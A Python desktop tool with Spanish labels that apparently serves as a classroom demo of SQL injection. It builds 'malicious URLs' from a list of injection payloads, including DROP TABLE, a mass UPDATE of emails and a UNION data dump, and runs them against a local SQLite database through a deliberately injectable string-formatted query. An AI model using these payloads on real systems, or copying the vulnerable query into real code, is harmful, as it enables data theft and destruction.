import customtkinter as ctk
import sqlite3
from tkinter import messagebox

# Lista de ejemplos de inyección SQL
inyecciones_sql = [
    "' OR '1'='1",  # Inyección para obtener todos los registros
    "' OR 'x'='x",  # Eludir autenticación
    "'; DROP TABLE customers; --",  # Eliminar tabla
    "'; UPDATE customers SET email='hacked@example.com'; --",  # Modificar datos
    "' UNION SELECT name, email, phone FROM customers; --",  # Obtener información de otra tabla
    "admin' --",  # Inyectar comentarios
    "'; SELECT * FROM sqlite_master; --",  # Obtener estructura de la base de datos
    "' OR EXISTS(SELECT 1 FROM customers WHERE email LIKE '%@%') --"  # Comprobar existencia de emails
]

# Función para realizar el ataque de inyección SQL a la URL vulnerable
def atacar_sql_inyeccion():
    # Capturar la URL y la selección de inyección SQL del usuario
    url = entry_url.get()
    seleccion = combo_inyeccion.get()

    if not url:
        messagebox.showerror("Error", "Debes ingresar una URL")
        return

    # Comprobar si la URL contiene el parámetro esperado
    if "name=" not in url:
        messagebox.showerror("Error", "La URL debe contener el parámetro 'name='")
        return

    # Insertar la inyección en la URL
    url_maliciosa = url.replace("name=", f"name={seleccion}")

    cuadro_resultado.delete(1.0, ctk.END)
    cuadro_resultado.insert(ctk.END, f"URL maliciosa generada: {url_maliciosa}\n")
    cuadro_resultado.insert(ctk.END, "Iniciando ataque...\n\n")

    # Conexión a la base de datos de ejemplo
    conn = sqlite3.connect('compras.db')
    cursor = conn.cursor()

    try:
        # Simulación de ejecución de la consulta con inyección
        query = f"SELECT * FROM customers WHERE name = '{seleccion}'"
        cursor.execute(query)
        resultados = cursor.fetchall()

        # Mostrar resultados
        if resultados:
            for row in resultados:
                cuadro_resultado.insert(ctk.END, f"ID: {row[0]}, Nombre: {row[1]}, Email: {row[2]}, Teléfono: {row[3]}\n")
        else:
            cuadro_resultado.insert(ctk.END, "No se encontraron resultados")

    except sqlite3.Error as e:
        messagebox.showerror("Error", f"Error en la base de datos: {e}")
    finally:
        conn.close()

# Función para limpiar el cuadro de texto y los campos de entrada
def limpiar():
    entry_url.delete(0, ctk.END)  # Limpiar la URL de entrada
    cuadro_resultado.delete(1.0, ctk.END)  # Limpiar el cuadro de resultados
    combo_inyeccion.set('')  # Restablecer la selección en la lista desplegable

# Interfaz gráfica para la simulación de inyección SQL
def inicializar_interfaz_sql_inyeccion():
    root = ctk.CTk()
    root.title("Simulación de Ataque de Inyección SQL")
    root.geometry("1200x800")  # Tamaño de ventana 1200x800

    # Título
    ctk.CTkLabel(root, text="Simulación de Ataque de Inyección SQL", font=("Arial", 24)).pack(pady=20)

    global entry_url, combo_inyeccion, cuadro_resultado

    # Entrada para la URL del sitio vulnerable
    ctk.CTkLabel(root, text="Introduce la URL Vulnerable (con el parámetro 'name=')", font=("Arial", 16)).pack(pady=10)
    entry_url = ctk.CTkEntry(root, width=1000, font=("Arial", 14))
    entry_url.pack(pady=10)

    # Lista desplegable para seleccionar el tipo de inyección SQL
    ctk.CTkLabel(root, text="Selecciona un ejemplo de inyección SQL", font=("Arial", 16)).pack(pady=10)
    combo_inyeccion = ctk.CTkComboBox(root, values=inyecciones_sql, width=800, font=("Arial", 14))
    combo_inyeccion.pack(pady=10)

    # Botón para ejecutar el ataque
    ctk.CTkButton(root, text="Ejecutar Ataque SQL", command=atacar_sql_inyeccion, width=300, font=("Arial", 16)).pack(pady=20)

    # Botón para limpiar el formulario y resultados
    ctk.CTkButton(root, text="Limpiar y Preparar Nuevo Ataque", command=limpiar, width=300, font=("Arial", 16)).pack(pady=10)

    # Cuadro de texto para mostrar los resultados del ataque
    cuadro_resultado = ctk.CTkTextbox(root, width=1000, height=400, font=("Arial", 12))
    cuadro_resultado.pack(pady=20)

    root.mainloop()

# Ejecutar la interfaz
inicializar_interfaz_sql_inyeccion()
